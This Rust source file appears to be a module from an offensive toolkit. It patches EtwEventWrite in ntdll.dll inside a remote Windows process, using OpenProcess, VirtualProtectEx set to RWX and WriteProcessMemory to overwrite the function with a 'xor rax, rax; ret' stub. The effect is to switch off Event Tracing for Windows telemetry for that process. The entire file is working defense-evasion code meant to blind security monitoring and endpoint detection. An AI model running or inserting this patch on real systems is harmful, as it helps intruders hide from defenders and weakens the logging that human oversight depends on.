//! ETW (Event Tracing for Windows) patching
//!
//! Patches EtwEventWrite in ntdll.dll in a remote process to disable ETW logging,
//! effectively bypassing ETW-based telemetry for that process.

use crate::MiscError;
use std::ffi::CString;
use windows::core::PCSTR;
use windows::Win32::Foundation::{CloseHandle, HANDLE};
use windows::Win32::System::Diagnostics::Debug::FlushInstructionCache;
use windows::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryExA, DONT_RESOLVE_DLL_REFERENCES};
use windows::Win32::System::Memory::{VirtualProtectEx, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE};

/// Patch EtwEventWrite in a remote process to disable ETW logging.
///
/// This patches the function to immediately return 0 (STATUS_SUCCESS),
/// preventing any ETW events from being logged by the target process.
///
/// The patch overwrites the function prolog with:
/// ```asm
/// xor rax, rax    ; 48 33 C0 - Zero out RAX (return STATUS_SUCCESS)
/// ret             ; C3       - Return immediately
/// ```
///
/// # Arguments
/// * `pid` - Target process ID
///
/// # Returns
/// * `Ok(())` on success
/// * `Err(MiscError)` on failure
pub fn patch_etw(pid: u32) -> Result<(), MiscError> {
    unsafe {
        let process_handle = OpenProcess(
            PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
            false,
            pid,
        )
        .map_err(|_| MiscError::OpenProcessFailed(pid))?;

        let result = patch_etw_internal(process_handle, pid);
        let _ = CloseHandle(process_handle);
        result
    }
}

unsafe fn patch_etw_internal(process_handle: HANDLE, _pid: u32) -> Result<(), MiscError> {
    // Load ntdll.dll locally without resolving imports
    // This DLL will be loaded at the same address in the target process (ASLR)
    let dll_name = CString::new("ntdll.dll").unwrap();
    let module_handle = LoadLibraryExA(
        PCSTR::from_raw(dll_name.as_ptr() as *const u8),
        None,
        DONT_RESOLVE_DLL_REFERENCES,
    )
    .map_err(|_| MiscError::EtwPatchFailed("Failed to load ntdll.dll locally".to_string()))?;

    if module_handle.is_invalid() {
        return Err(MiscError::EtwPatchFailed(
            "ntdll.dll not found".to_string(),
        ));
    }

    // Get EtwEventWrite address
    let func_name = CString::new("EtwEventWrite").unwrap();
    let etw_event_write = GetProcAddress(
        module_handle,
        PCSTR::from_raw(func_name.as_ptr() as *const u8),
    );

    let etw_event_write = match etw_event_write {
        Some(addr) => addr as *mut u8,
        None => {
            return Err(MiscError::EtwPatchFailed(
                "EtwEventWrite not found in ntdll.dll".to_string(),
            ));
        }
    };

    // ETW patch shellcode:
    //   xor rax, rax    ; 48 33 C0 - Zero out RAX (return STATUS_SUCCESS)
    //   ret             ; C3       - Return immediately
    //
    // This makes EtwEventWrite immediately return 0 without doing anything,
    // effectively disabling all ETW logging from this process.
    let etw_patch: [u8; 4] = [
        0x48, 0x33, 0xC0,   // xor rax, rax
        0xC3,               // ret
    ];

    // Read original bytes to verify we're patching the right location
    let mut original_bytes: [u8; 4] = [0u8; 4];
    let mut bytes_read: usize = 0;
    let read_result = windows::Win32::System::Diagnostics::Debug::ReadProcessMemory(
        process_handle,
        etw_event_write as *const _,
        original_bytes.as_mut_ptr() as *mut _,
        original_bytes.len(),
        Some(&mut bytes_read),
    );

    if read_result.is_err() || bytes_read != original_bytes.len() {
        return Err(MiscError::EtwPatchFailed(
            "Failed to read original bytes from target process".to_string(),
        ));
    }

    // Check if already patched
    if original_bytes == etw_patch {
        return Err(MiscError::EtwPatchFailed(
            "EtwEventWrite is already patched".to_string(),
        ));
    }

    // Change memory protection to RWX
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    VirtualProtectEx(
        process_handle,
        etw_event_write as *const _,
        etw_patch.len(),
        PAGE_EXECUTE_READWRITE,
        &mut old_protect,
    )
    .map_err(|_| MiscError::VirtualProtectFailed)?;

    // Write patch bytes
    let mut bytes_written: usize = 0;
    let write_result = windows::Win32::System::Diagnostics::Debug::WriteProcessMemory(
        process_handle,
        etw_event_write as *mut _,
        etw_patch.as_ptr() as *const _,
        etw_patch.len(),
        Some(&mut bytes_written),
    );

    // Restore original protection
    let mut temp_protect = PAGE_PROTECTION_FLAGS(0);
    let _ = VirtualProtectEx(
        process_handle,
        etw_event_write as *const _,
        etw_patch.len(),
        old_protect,
        &mut temp_protect,
    );

    if write_result.is_err() || bytes_written != etw_patch.len() {
        return Err(MiscError::WriteFailed);
    }

    // Flush instruction cache
    FlushInstructionCache(process_handle, Some(etw_event_write as *const _), etw_patch.len())
        .map_err(|_| MiscError::EtwPatchFailed("FlushInstructionCache failed".to_string()))?;

    Ok(())
}
